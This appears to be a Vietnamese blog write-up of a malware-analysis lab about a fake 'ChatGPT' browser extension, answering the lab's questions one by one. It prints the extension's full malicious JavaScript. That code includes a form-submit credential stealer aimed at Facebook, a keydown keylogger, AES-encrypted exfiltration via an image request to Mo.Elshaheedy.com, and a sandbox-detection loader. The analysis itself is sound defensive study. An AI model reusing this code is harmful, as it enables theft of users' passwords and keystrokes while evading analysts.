---
title: "Using wireshark for HTTP"
date: 2026-04-08 07:00:00 +0700
categories: [FakeGPT, malicious]
tags: [fakegpt]
---
## Scenarion :

Your cybersecurity team has been alerted to suspicious activity on your organization's network. Several employees reported unusual behavior in their browsers after installing what they believed to be a helpful browser extension named "ChatGPT". However, strange things started happening: accounts were being compromised, and sensitive information appeared to be leaking.

mình sẽ mô tả lại một chút về trường hợp này, họ đã phát hiện có một vài employees có những behavior bất thường trên browser của họ sau khi tải một extension có tên là ChatGPT, nghe thì thấy thân quen nhưng thật ra họ đã tải extension fake và một vài máy đã bị compromise khi thực hiện extension này. Đây là một extension có nhiều sự bất thường trong đó và họ muốn mình phân tích. Nói thẳng ra đây là một extension bị fake và có malware nằm trong đó nên trước khi làm bất cứ điều gì các bạn phải thật cẩn trọng với những extension này.

## Thực Hành

### Which encoding method does the browser extension use to obscure target URLs, making them more difficult to detect during analysis?

thì ở đây nó đã ẩn cái url mà malware theo dõi, dạng như bạn vào một url nào đó thì khi bạn nhập password thì nó sẽ theo dõi hành động của bạn, nhưng để làm khó khăn trong việc phân tích nên url đó đã bị encode thì dưới đây chính là cách mình phân tích và trả lời câu hỏi này : 

Đầu tiên mình sẽ vào source code của nó và dưới đây chính là source code của extension đó.

```jsx
(function() {
    var _0xabc1 = function(_0x321a) {
        return _0x321a;
    };
    var _0x5eaf = function(_0x5fa1) {
        return btoa(_0x5fa1);
    };

    const targets = [_0xabc1('d3d3LmZhY2Vib29rLmNvbQ==')];
    if (targets.indexOf(window.location.hostname) !== -1) {
        document.addEventListener('submit', function(event) {
            let form = event.target;
            let formData = new FormData(form);
            let username = formData.get('username') || formData.get('email');
            let password = formData.get('password');

            if (username && password) {
                exfiltrateCredentials(username, password);
            }
        });

        document.addEventListener('keydown', function(event) {
            var key = event.key;
            exfiltrateData('keystroke', key);
        });
    }

    function exfiltrateCredentials(username, password) {
        const payload = { user: username, pass: password, site: window.location.hostname };
        const encryptedPayload = encryptPayload(JSON.stringify(payload));
        sendToServer(encryptedPayload);
    }

    function encryptPayload(data) {
        const key = CryptoJS.enc.Utf8.parse('SuperSecretKey123');
        const iv = CryptoJS.lib.WordArray.random(16);
        const encrypted = CryptoJS.AES.encrypt(data, key, { iv: iv });
        return iv.concat(encrypted.ciphertext).toString(CryptoJS.enc.Base64);
    }

    function sendToServer(encryptedData) {
        var img = new Image();
        img.src = 'https://Mo.Elshaheedy.com/collect?data=' + encodeURIComponent(encryptedData);
        document.body.appendChild(img);
    }

    function exfiltrateData(type, data) {
        const payload = { type: type, data: data, site: window.location.hostname };
        const encryptedPayload = encryptPayload(JSON.stringify(payload));
        sendToServer(encryptedPayload);
    }
})();
```

đây chính là source code mà nó dùng để thực hiện hành vi bất thường, và theo dõi user cũng như send credential đã lấy được tới server:

```jsx
   const targets = [_0xabc1('d3d3LmZhY2Vib29rLmNvbQ==')];
    if (targets.indexOf(window.location.hostname) !== -1) {
        document.addEventListener('submit', function(event) {
            let form = event.target;
            let formData = new FormData(form);
            let username = formData.get('username') || formData.get('email');
            let password = formData.get('password');

            if (username && password) {
                exfiltrateCredentials(username, password);
            }
        });
```

thì đây chính là hàm mà chứa target để theo dõi, bạn có thể nhìn thấy có một chuổi ký tự đã bị mã hòa bằng base64 ở đầu, thì khi mình decode nó ra thì kết quả trả về như thế này

![image.png](./assets/fakegpt/1.png)

đây là output mà mình nhận được sau khi decode, có nghĩa là họ theo dõi user khi vào facebook và ghi lại password cũng như name của user. Cách mà họ đã encode URL này chính là Base64. Tại sao họ lại làm như vậy, thì để trong quá trình phân tích sẽ làm mình trở nên rối và khó xử lý hơn bên cạnh đó khi encode họ có thể tránh được các detection và tránh được các rules.

### Which type of HTML element is utilized by the extension to send stolen data?

Thường thì nếu là data exfiltration thì sẽ có function dùng để gửi dữ liệu ra bên ngoài, bên cạnh đó họ muốn mình xác định được thể loại HTML nào được họ dùng để gửi dữ liệu ra bên ngoài

```jsx
    function sendToServer(encryptedData) {
        var img = new Image();
        img.src = 'https://Mo.Elshaheedy.com/collect?data=' + encodeURIComponent(encryptedData);
        document.body.appendChild(img);
    }
```

thì đây chính là function mà họ dùng để data exfiltration, mình đã  phát hiện được rằng khi họ có được data thì họ sẽ encode và gửi dữ liệu ra ngoài bằng hình ảnh, giúp khó phát hiện hơn và làm người phân tích bị nhầm tưởng đó chỉ là gửi hình ảnh ra ngoài.

⇒ <img> chính là element họ dùng để data exfiltration, thì tại sao họ lại chọn image mà không phải là cái khác thì bản chất bởi vì image rất dễ upload và rất khó phát hiện ví dụ như bạn gửi ảnh lên một web nào đó thì đó là điều rất bình thường, khi kiểm tra respond thì cũng không có gì là khả nghi hay gọi là đáng gờm hết. Nhưng làm sao mình phát hiện được điều này, đó mời là vấn đề thì mình có thể kiểm tra nó thông qua Request của nó

```jsx
img.src = 'https://Mo.Elshaheedy.com/collect?data=' + encodeURIComponent(encryptedData);
```

bạn có thể thấy khi nó gửi request đi thì trên wireshark sẽ hiện những cái mà http protocol trả về rất bất thường như những mã dài hay các thứ thì mình sẽ phát hiện được.

### What is the first specific condition in the code that triggers the extension to deactivate itself?

Ở đây họ có tạo một file chứa các source code mà khi phát hiện môi trường sandbox hoặc là môi trường nguy hiểm thì họ sẽ deactivate và không run cái app.js đó :

```jsx
(function() {
    var _0xabc1 = function(_0x321a) {
        return _0x321a;
    };
    // Check if the browser is in a virtual environment
    if (navigator.plugins.length === 0 || /HeadlessChrome/.test(navigator.userAgent)) {
        alert("Virtual environment detected. Extension will disable itself.");
        chrome.runtime.onMessage.addListener(() => { return false; });
    }

    // Load additional scripts dynamically
    function loadScript(url, callback) {
        var script = document.createElement('script');
        script.src = url;
        script.onload = callback;
        document.head.appendChild(script);
    }

    // Load and execute the core functionality
    loadScript('core/app.js', function() {
        console.log('Core functionality loaded.');
    });
})();

```

Đây chính là source code mà họ đã tạo để tránh việc bị phát hiện cũng như deactivate khi phát hiện nguy hiểm

```jsx
    if (navigator.plugins.length === 0 || /HeadlessChrome/.test(navigator.userAgent)) {
        alert("Virtual environment detected. Extension will disable itself.");
        chrome.runtime.onMessage.addListener(() => { return false; });
    }
```

đây chính là function mà họ dùng để phát hiện, cùng mình phân tích một chút về nó nhé. Thì ở trên các sandbox hay virtual thì các plugin thường rỗng bởi vì rất được ít khi sử dụng 

```jsx
(navigator.plugins.length === 0 || /HeadlessChrome/.test(navigator.userAgent))
```

Khi người dùng thật sử dụng thì các plugins thướng ≥ 0 vậy nên điều này sẽ giúp nó nhận biết được đang thực hiện trên máy nào, còn về phần HeadlessChrome thì ở trên máy thường sẽ là Chrome còn các Virtual hay Sandbox thì sẽ là Headlesschrome. Đây chính là điểm mấu chốt của vấn đề nếu mình phân tích mà chạy trên máy ảo thì nó sẽ không active và việc phân tích của mình trở nên vô nghĩa thì làm sao mình có thể giải quyết được vấn đề và kết thúc cuộc chiến tranh Fingerprinting war này. Thì mình sẽ sửa source code của nó bên cạnh đó mình sẽ fake agent làm sao để nó không nhận diện được và làm những hành động giống như một user đang hoạt động.

### Which event does the extension capture to track user input submitted through forms?

Thì bản chất của câu hỏi này là malware hook vào đâu để trước khi gửi dữ liệu ra ngoài, có nghĩa là khi user nhấn vào cái gì đó thì sẽ bị lộ thông tin và đây là cách mình phân tích nó 

```jsx
    const targets = [_0xabc1('d3d3LmZhY2Vib29rLmNvbQ==')];
    if (targets.indexOf(window.location.hostname) !== -1) {
        document.addEventListener('submit', function(event) { .// day la cho minh phan tich
            let form = event.target;
            let formData = new FormData(form);
            let username = formData.get('username') || formData.get('email');
            let password = formData.get('password');

            if (username && password) {
                exfiltrateCredentials(username, password);
            }
        });
```

Thì các bạn có thể quan sát được rằng nó có hàm addEventListner và có phần submit thì trong HTML nó sẽ có dạng như thế này 

```jsx
<form>
  <input name="username">
  <input name="password">
  <button type="submit">Login</button>
</form>
```

bạn có thể thấy submit là phần login khi user nhấn vào, thì khi họ login submit đó sẽ được add vào một file documents và sau đó sẽ tới các bước tiếp theo, như các bạn đã biết target của họ là facebook và khi vào trang facebook việc đầu tiên là các bạn sẽ nhập thông tin để login, ở đâu malware không thực hiện capture hay gì hết mà nó dựa vào type của HTML và khi Login được thực hiện thì malware sẽ có được những thứ mà user đã nhập đó gọi là credential.

⇒ Submit.

### Which API or method does the extension use to capture and monitor user keystrokes?

thì ở đây họ muốn mình xác định được API hoặc method mà malware đã dùng để capture những gì user đã input

```
    document.addEventListener('keydown', function(event) {
        var key = event.key;
        exfiltrateData('keystroke', key);
    })
```

đây chính là hàm mà malware đã dùng để capture and monitor khi user input, mình đã thấy được rằng malware đã dùng **keydown** ở đây, thì **keydown** có nghĩa là gì thì nó là một event trong java nó được xảy ra khi người dùng nhấn xuống một bàn phìm, thì khi nhấn gì event này sẽ trigger, khi hiểu bản chất này bạn sẽ dễ dàng phân tích và hiểu hơn.

### What is the domain where the extension transmits the exfiltrated data?

Thì ở đây người ta muốn mình xác định domain mà nhận những dữ liệu này khi được gửi từ user, dưới đây là cách mình phân tích : 

```jsx
    function sendToServer(encryptedData) {
        var img = new Image();
        img.src = 'https://Mo.Elshaheedy.com/collect?data=' + encodeURIComponent(encryptedData);
        document.body.appendChild(img);
    }
```

đây là function mà họ dùng để gửi tới server và server này có domain : Mo.Elshaheedy.com

thì khi mình kiểm tra xem domain này có gì bất thường hay không thì nó khá là sạch sẽ 

![image.png](./assets/fakegpt/2.png)

bên cạnh đó mình còn kiểm tra thêm nó ở đâu và như thế nào thì mình thấy không có điểm gì bất thường về nó. Nhưng đây là server do hacker tạo để nhận data vậy nên họ vẫn không thể kiểm tra được điều gì đã xảy ra trong server đó và bật cảnh báo.

## Tổng kết :

Ở đây khi cài các extension từ internet về máy thì chúng ta nên rút kinh nghiệm và kiểm tra bản an toàn của nó chứ nếu không thì nguy cơ dính mã độc rất cao, như extension ChatGPT trên là một ví dụ nó sẽ thực hiện những hành động mà mình và bạn không thể ngờ tới được, nếu nó có được credential about facebook của bạn thì hậu quả sẽ khó nói, có thể họ lợi dụng uy tín của bạn để scam hoặc bla bla…

Đến đây tay cũng mệt rồi, các bạn làm việc tiếp đi, tôi đi học đâyyyyyy.
